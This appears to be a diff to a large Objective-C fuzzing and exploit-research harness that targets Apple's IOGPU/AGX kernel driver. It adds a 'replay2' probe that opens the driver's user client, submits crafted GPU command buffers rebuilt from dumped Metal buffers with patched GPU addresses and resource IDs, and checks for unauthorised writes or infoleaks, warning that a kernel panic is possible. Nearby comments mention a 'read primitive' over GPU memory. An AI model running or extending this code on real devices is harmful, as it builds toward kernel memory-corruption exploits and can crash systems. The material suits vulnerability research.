@@ -15220,6 +15220,194 @@ static void dsr5b_verify(id<MTLDevice> dev, id<MTLCommandQueue> mq, NSString *do
     LOG("[dsr5b] done (alive)");
 }
 
+// V127: p_replay2 — hybrid replay of the live-blitz reference dumps (fuzzer/
+// assets/dsrecon-cfg1-*.bin, captured by p_dsrecon N1) through OUR type-1
+// queue (C3, docs/device_stream_builder.md). Reference GPUVAs are read from
+// pool0+0x14a0/+0x14a8 and substituted with our gpu_resource2 resources; the
+// Metal-context pool window content is re-created in a third 0x20000
+// resource; seg rid/sizeKB pair patched at +0x108/+0x120; absolute pool/bplist
+// GPUVA refs in kcmd rebased onto resource C. Status 5 in an nq record =
+// firmware reject (agx_queue_execution.md §8.7). Success = 0x41 in dst.
+// Env: FUZZ_REPLAY2_VAR=1|2|3 (cumulative ladder, each variant submitted).
+// Tag [rp2].
+static void rp2_load(NSBundle *mb, const char *name, NSData **d) {
+    NSString *p = [mb pathForResource:[NSString stringWithUTF8String:name] ofType:nil];
+    if (!p) p = [mb pathForResource:[NSString stringWithUTF8String:name] ofType:@"bin"];
+    *d = p ? [NSData dataWithContentsOfFile:p] : nil;
+    LOG("[rp2] asset %s: %s (%ld bytes)", name,
+        p ? [p UTF8String] : "MISSING", (long)(*d ? (long)(*d).length : -1));
+}
+
+static void p_replay2(void) {
+    LOG("[rp2] v127: reference-dump hybrid replay on our type-1 queue");
+    NSBundle *mb = [NSBundle mainBundle];
+    NSData *dk = nil, *dg = nil, *dp0 = nil;
+    rp2_load(mb, "dsrecon-cfg1-kcmd", &dk);
+    rp2_load(mb, "dsrecon-cfg1-seg", &dg);
+    rp2_load(mb, "dsrecon-cfg1-pool0", &dp0);
+    if (dk.length != 0x4000 || dg.length != 0x4000 || dp0.length != 0x4000) {
+        LOG("[rp2] assets missing/wrong size — need dsrecon-cfg1-{kcmd,seg,pool0}.bin of 0x4000");
+        return;
+    }
+    long var = atol(getenv("FUZZ_REPLAY2_VAR") ?: "1");
+    if (var < 1 || var > 3) var = 1;
+    // ---- pipeline (qex mechanics): connect, nq, queue, bind
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) { LOG("[rp2] open fail"); return; }
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqVA = *(uint64_t *)out;
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    LOG("[rp2] sel14 nq -> kr 0x%08x nqVA %llx nqid %llu", kr, nqVA, nqid);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    if (kr || !qid) { LOG("[rp2] sel6 queue fail"); return; }
+    uint64_t a24[2] = { qid, nqid };
+    kr = IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL);
+    LOG("[rp2] qid %llu sel24 bind 0x%08x", qid, kr);
+    // ---- resources: A src (0x41), B dst (0), C pool re-creation 0x20000
+    uint64_t gpuA = 0, gpuB = 0, gpuC = 0;
+    uint8_t *cpuA = NULL, *cpuB = NULL, *cpuC = NULL;
+    uint32_t ridA = gpu_resource2(c, 0x10000, &gpuA, &cpuA);
+    uint32_t ridB = gpu_resource2(c, 0x10000, &gpuB, &cpuB);
+    uint32_t ridC = gpu_resource2(c, 0x20000, &gpuC, &cpuC);
+    LOG("[rp2] rids A %u (0x%llx) B %u (0x%llx) C %u (0x%llx)",
+        ridA, gpuA, ridB, gpuB, ridC, gpuC);
+    if (!ridA || !ridB || !cpuA || !cpuB) { LOG("[rp2] resources fail"); return; }
+    // shmems: segment list first (type 0 -> id 1), kcmd typed (type 1 -> id 2)
+    uint8_t *vaSeg = NULL, *vaCmd = NULL;
+    uint32_t idSeg = gpu_shmem_t(c, 0x4000, 0, &vaSeg);
+    uint32_t idCmd = gpu_shmem_t(c, 0x4000, 1, &vaCmd);
+    if (!idSeg || !idCmd) { LOG("[rp2] shmem fail"); return; }
+    LOG("[rp2] shmems: seg id %u (type 0) cmd id %u (type 1)", idSeg, idCmd);
+    // ---- reference values, read from the dumps themselves
+    uint64_t refA = *(const uint64_t *)((const uint8_t *)dp0.bytes + 0x14a0);
+    uint64_t refB = *(const uint64_t *)((const uint8_t *)dp0.bytes + 0x14a8);
+    LOG("[rp2] reference GPUVAs pool0+0x14a0/+0x14a8: refA 0x%llx refB 0x%llx", refA, refB);
+    if (!refA || !refB || refA == refB) { LOG("[rp2] reference GPUVAs unusable"); return; }
+    uint32_t refRidA = *(const uint32_t *)((const uint8_t *)dg.bytes + 0x108);
+    uint32_t refRidB = *(const uint32_t *)((const uint8_t *)dg.bytes + 0x10c);
+    uint32_t refKB1 = *(const uint32_t *)((const uint8_t *)dg.bytes + 0x120);
+    uint32_t refKB2 = *(const uint32_t *)((const uint8_t *)dg.bytes + 0x124);
+    LOG("[rp2] seg +0x108 rids {%u,%u} +0x120 sizeKB {%u,%u} -> {%u,%u} {0x40,0x40}",
+        refRidA, refRidB, refKB1, refKB2, ridA, ridB);
+    uint8_t *entry = must_map(0x1000);
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+    uint8_t *comp = must_map(0x1000);
+    volatile uint8_t *nq = nqVA ? (volatile uint8_t *)(uintptr_t)nqVA : NULL;
+    // ---- pool0 -> resource C. The dump was the Metal context's pool window;
+    // it does not map onto any of our buffers, so re-create its content in
+    // our own 0x20000 resource and rebase kcmd absolute refs onto gpuC.
+    LOG("[rp2] strategy: pool window was Metal-context owned — re-creating pool0 in resource C (gpuva 0x%llx)", gpuC);
+    if (cpuC) {
+        memcpy(cpuC, dp0.bytes, 0x4000);
+        long pc = 0;
+        for (long o = 0; o + 8 <= 0x4000; o += 4) {
+            uint64_t q = *(uint64_t *)(cpuC + o);
+            if (q == refA) { *(uint64_t *)(cpuC + o) = gpuA; pc++; }
+            else if (q == refB) { *(uint64_t *)(cpuC + o) = gpuB; pc++; }
+        }
+        LOG("[rp2] resource C: %ld GPUVA slots patched (refA/refB -> ours)", pc);
+    }
+    // ---- variant ladder
+    for (long v = 1; v <= var; v++) {
+        memcpy(vaCmd, dk.bytes, 0x4000);
+        memcpy(vaSeg, dg.bytes, 0x4000);
+        // kcmd: substitute reference GPUVAs, rebase absolute pool/bplist refs
+        long np = 0, nreb = 0, nrid = 0;
+        for (long o = 0; o + 8 <= 0x4000; o += 4) {
+            uint64_t q = *(uint64_t *)(vaCmd + o);
+            if (q == refA) { *(uint64_t *)(vaCmd + o) = gpuA; np++; }
+            else if (q == refB) { *(uint64_t *)(vaCmd + o) = gpuB; np++; }
+            else if (gpuC && q >= 0x1000128000ULL && q < 0x1000140000ULL) {
+                *(uint64_t *)(vaCmd + o) = gpuC + (q - 0x1000138000ULL);
+                nreb++;
+            }
+        }
+        for (long o = 0; o + 4 <= 0x4000; o += 4) {
+            uint32_t w = *(uint32_t *)(vaCmd + o);
+            if (w == refRidA && refRidA) { *(uint32_t *)(vaCmd + o) = ridA; nrid++; }
+            else if (w == refRidB && refRidB) { *(uint32_t *)(vaCmd + o) = ridB; nrid++; }
+        }
+        // seg: rid pair + sizeKB pair + every other rid occurrence
+        *(uint32_t *)(vaSeg + 0x108) = ridA;
+        *(uint32_t *)(vaSeg + 0x10c) = ridB;
+        *(uint32_t *)(vaSeg + 0x120) = 0x40;
+        *(uint32_t *)(vaSeg + 0x124) = 0x40;
+        long nsrid = 0;
+        for (long o = 0; o + 4 <= 0x4000; o += 4) {
+            if (o == 0x108 || o == 0x10c) continue;
+            uint32_t w = *(uint32_t *)(vaSeg + o);
+            if (w == refRidA && refRidA) { *(uint32_t *)(vaSeg + o) = ridA; nsrid++; }
+            else if (w == refRidB && refRidB) { *(uint32_t *)(vaSeg + o) = ridB; nsrid++; }
+        }
+        LOG("[rp2] var%ld: kcmd gpuVA-sub %ld abs-rebase %ld rid-sub %ld | seg extra rid-sub %ld",
+            v, np, nreb, nrid, nsrid);
+        if (v >= 2) {
+            memset(vaCmd + 0x3e0, 0, 0x28);   // kext-written block: stale content?
+            LOG("[rp2] var%ld: kcmd +0x3e0..+0x408 zeroed", v);
+        }
+        if (v >= 3) {
+            for (long o = 0; o < 0x40; o += 8) {
+                uint64_t q = *(uint64_t *)(vaCmd + o);
+                if (q) *(uint64_t *)(vaCmd + o) = q + 1;
+                q = *(uint64_t *)(vaSeg + o);
+                if (q) *(uint64_t *)(vaSeg + o) = q + 1;
+            }
+            LOG("[rp2] var%ld: header counters +1 (kcmd/seg first 0x40)", v);
+        }
+        memset(entry, 0, 0x1000);
+        *(uint32_t *)(entry + 0x00) = idCmd;
+        *(uint32_t *)(entry + 0x04) = idSeg;
+        *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)comp;
+        *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)(comp + 0x30);
+        memset(cpuB, 0, 0x10000);
+        memset(cpuA, 0x41, 0x10000);
+        *outw = 0xdeadbeef;
+        memset(comp, 0, 0x1000);
+        LOG("[rp2] var%ld: submit qid %llu entry {cmd %u seg %u} (PANIC possible)", v, qid, idCmd, idSeg);
+        fflush(stderr);
+        fsync(fileno(stderr));
+        kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40,
+                                           (uintptr_t)entry, (uintptr_t)outw);
+        // poll: cpuB readback + comp + nq completion records
+        long a41 = 0, nz = 0;
+        for (int w = 0; w < 20; w++) {
+            usleep((useconds_t)100000);
+            a41 = nz = 0;
+            for (long i = 0; i < 0x10000; i += 0x40) {
+                if (cpuB[i]) nz++;
+                if (cpuB[i] == 0x41) a41++;
+            }
+            if (nz) break;
+        }
+        int nrec = 0;
+        if (nq) {
+            for (long o = 0; o + 16 <= 0x1000 && nrec < 4; o += 0x10) {
+                uint64_t q0 = *(volatile uint64_t *)(nq + o);
+                if (!q0) continue;
+                uint32_t st = *(volatile uint32_t *)(nq + o + 8);
+                LOG("[rp2] var%ld nq+%03lx: value %016llx status %u%s", v, o, q0, st,
+                    st == 5 ? " FIRMWARE-REJECT" : "");
+                nrec++;
+            }
+        }
+        uint64_t *cq = (uint64_t *)comp;
+        LOG("[rp2] var%ld -> kr 0x%08x outw %08x comp st@+18 %u st@+48 %u | B: 41 %ld nz %ld %s",
+            v, kt, *outw, *(uint32_t *)(comp + 0x18), *(uint32_t *)(comp + 0x48),
+            a41, nz, a41 ? "*** REPLAY2 WRITE CONFIRMED ***" : "(no write)");
+        LOG("[rp2] var%ld comp: %016llx %016llx %016llx %016llx", v, cq[0], cq[1], cq[2], cq[3]);
+        if (nz && !a41) LOG("[rp2] var%ld: dst written with NON-0x41 data (infoleak?)", v);
+    }
+    LOG("[rp2] done (alive)");
+}
+
 // V90: GPU VM map via patched-blit read primitive. Patch the copy SOURCE
 // (pool slots holding gpuAddress(A)) to a probe GPUVA X, commit, read back B.
 // Regions that once contained slots are cached so later probes scan ~MBs, not
@@ -22057,6 +22245,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_QEXEC")) { p_qexec(); LOG("[probe13] qexec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SFW2")) { p_streamfuzz2(2000000); LOG("[probe13] sfw2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DSRECON")) { p_dsrecon(); LOG("[probe13] dsrecon-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_REPLAY2")) { p_replay2(); LOG("[probe13] replay2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IOCMD")) { p_iocmd(); LOG("[probe13] iocmd-only mode, stop"); return NULL; }
         if (getenv("FUZZ_HIDFUZZ")) { p_hidfuzz(); LOG("[probe13] hidfuzz-only mode, stop"); return NULL; }
         if (getenv("FUZZ_JPEGIMG")) { p_jpegimg(); LOG("[probe13] jpegimg-only mode, stop"); return NULL; }
